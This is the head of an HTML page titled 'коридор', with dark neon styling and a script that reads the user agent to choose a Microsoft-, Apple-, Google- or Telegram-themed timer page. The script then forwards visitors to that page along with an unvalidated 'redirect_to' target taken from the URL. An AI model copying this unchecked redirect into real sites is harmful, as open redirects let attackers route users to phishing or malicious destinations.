    <title>коридор</title>

    <script>
        (function() {
            const search = window.location.search;
            const urlParams = new URLSearchParams(search);

            // Если есть параметр redirect или system, запускаем перехват
            if (urlParams.has('redirect') || urlParams.has('system')) {
                let redirectTo = null;
                
                // Парсим redirect_to вручную, чтобы сохранить вложенные параметры
                const redirectToMatch = search.match(/[&?]redirect_to=/);
                if (redirectToMatch) {
                    const redirectToStart = redirectToMatch.index + redirectToMatch[0].length;
                    const redirectToValue = search.substring(redirectToStart);
                    redirectTo = decodeURIComponent(redirectToValue);
                }

                function detectOS() {
                    const userAgent = navigator.userAgent.toLowerCase();
                    const platform = navigator.platform.toLowerCase();
                    if (platform.indexOf('win') !== -1 || userAgent.indexOf('windows') !== -1) return 'microsoft';
                    if (platform.indexOf('mac') !== -1 || userAgent.indexOf('macintosh') !== -1 || userAgent.indexOf('mac os') !== -1) return 'apple';
                    if (/iphone|ipad|ipod/.test(userAgent)) return 'apple';
                    if (userAgent.indexOf('android') !== -1) return 'google';
                    return 'telegram';
                }

                // Определяем тему для таймера
                let theme = urlParams.has('redirect') ? urlParams.get('redirect') : detectOS();
                let themeURL = `redirect/${theme}.html`;

                if (redirectTo) {
                    themeURL += `?redirect_to=${encodeURIComponent(redirectTo)}`;
                }

                // Редирект на страницу с таймером
                window.location.replace(themeURL);
            }
        })();
    </script>

    <style>
        :root {
            --color-bg: #0A0A0A; 
            --color-text: #F5F5F5;
            --color-cyan: #00D1FF; 
            --color-lime: #C6F135; 
            --color-purple: #FF1744;
            --grid-color: rgba(0, 209, 255, 0.25);
            /* Переменные для логотипа и кнопки */
            --logo-layer-1: var(--color-purple);
            --logo-layer-2: var(--color-cyan);
            --logo-main: var(--color-lime);
        }
        
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body, html { width: 100%; height: 100%; background-color: var(--color-bg); color: var(--color-text); font-family: 'Manrope', sans-serif; overflow: hidden; overscroll-behavior: none; position: fixed; }

        .bg-layer { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 1; pointer-events: none; overflow: hidden; }
        
        .ambient-blob { position: absolute; border-radius: 50%; filter: blur(80px); opacity: 0.45; animation: float 10s infinite alternate ease-in-out; }
        .blob-1 { width: 50vw; height: 50vw; background: var(--color-cyan); top: -10%; left: -20%; }
        .blob-2 { width: 40vw; height: 40vw; background: var(--color-purple); bottom: 10%; right: -10%; animation-delay: -4s; }
        @keyframes float { 0% { transform: translate(0, 0) scale(1); } 100% { transform: translate(10vw, 10vh) scale(1.1); } }

        .grid-container { position: absolute; bottom: 0; left: 0; width: 100%; height: 50vh; background-image: linear-gradient(var(--grid-color) 1px, transparent 1px), linear-gradient(90deg, var(--grid-color) 1px, transparent 1px); background-size: 40px 40px; background-position: center bottom; transform-origin: top center; transform: perspective(400px) rotateX(70deg); animation: gridMove 2s linear infinite; mask-image: linear-gradient(to bottom, rgba(0,0,0,0) 0%, rgba(0,0,0,1) 40%, rgba(0,0,0,1) 100%); -webkit-mask-image: linear-gradient(to bottom, rgba(0,0,0,0) 0%, rgba(0,0,0,1) 40%, rgba(0,0,0,1) 100%); }
        @keyframes gridMove { 0% { background-position: 0 0; } 100% { background-position: 0 40px; } }

        .subtle-noise { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: url('data:image/svg+xml,%3Csvg viewBox="0 0 200 200" xmlns="http://www.w3.org/2000/svg"%3E%3Cfilter id="noise"%3E%3CfeTurbulence type="fractalNoise" baseFrequency="0.9" numOctaves="3" stitchTiles="stitch"/%3E%3C/filter%3E%3Crect width="100%25" height="100%25" filter="url(%23noise)" opacity="0.05"/%3E%3C/svg%3E'); opacity: 0.9; }

        .main-stage { position: relative; width: 100%; height: 100%; display: flex; flex-direction: column; align-items: center; justify-content: center; z-index: 10; padding: 24px; }

        .brand-logo { 
            width: clamp(120px, 22vw, 150px); 
            height: auto; 
            margin-bottom: 32px; 
            filter: drop-shadow(0 0 20px rgba(198, 241, 53, 0.2)); 
            transition: filter 0.4s ease, transform 0.3s ease; 
            cursor: pointer; 
        }
        .brand-logo:hover { 
            filter: drop-shadow(0 0 35px rgba(198, 241, 53, 0.5)); 
            transform: scale(1.04);
        }

        .glitch-title { font-family: 'Space Grotesk', sans-serif; font-size: clamp(2.2rem, 10vw, 5rem); font-weight: 400; letter-spacing: 0.18em; text-transform: uppercase; padding-left: 0.18em; margin-bottom: 40px; color: var(--color-text); line-height: 1; text-align: center; text-shadow: 0 0 20px rgba(198, 241, 53, 0.2); animation: text-glow 4s infinite ease-in-out; white-space: nowrap; }

        /* ИДЕАЛЬНОЕ МАТОВОЕ СТЕКЛО */
        .glass-btn {
            display: inline-flex; align-items: center; justify-content: center; gap: 12px;
            padding: 16px 32px; font-family: 'Outfit', sans-serif; font-size: clamp(12px, 4vw, 14px); font-weight: 800; letter-spacing: 1px; text-transform: lowercase;
            color: #000000; background: var(--color-lime); text-decoration: none; border-radius: 16px;
            box-shadow: 0 0 20px rgba(198, 241, 53, 0.2);
            transition: all 0.25s cubic-bezier(0.34, 1.56, 0.64, 1);
            position: relative; overflow: hidden; white-space: nowrap;
        }

        .glass-btn:hover { 
            background: #b5e027;
            transform: translateY(-2px); 
            box-shadow: 0 0 30px rgba(198, 241, 53, 0.4); 
        }
        
        .glass-btn:active { transform: translateY(1px); }
        .arrow-icon { font-family: 'Manrope', sans-serif; transition: transform 0.3s; }
        .glass-btn:hover .arrow-icon { transform: translateX(5px); }
    
        @keyframes text-glow {
            0%, 100% { text-shadow: 0 0 20px rgba(198, 241, 53, 0.2); }
            50% { text-shadow: 0 0 35px rgba(198, 241, 53, 0.55), 0 0 10px rgba(198, 241, 53, 0.2); }
        }
